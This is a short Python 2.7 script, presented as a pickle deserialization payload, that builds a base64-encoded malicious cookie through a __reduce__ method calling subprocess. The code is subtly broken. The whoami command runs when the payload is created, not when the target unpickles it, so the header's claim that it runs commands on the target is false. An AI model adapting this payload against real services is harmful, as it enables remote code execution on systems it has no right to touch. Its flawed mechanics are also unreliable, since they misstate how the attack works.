# Deserialization using python and pickle
# Payload to run misc commands
# Will work only with Python 2.7

import subprocess
import pickle
import base64


class User(object):

    def __reduce__(self):
        return (self.__class__, (subprocess.check_output(["whoami"]), ))

    def __init__(self, name):
        self.name = name


user = User("james@palabs.xyz")
cookie = base64.b64encode(pickle.dumps(user))

print(cookie)
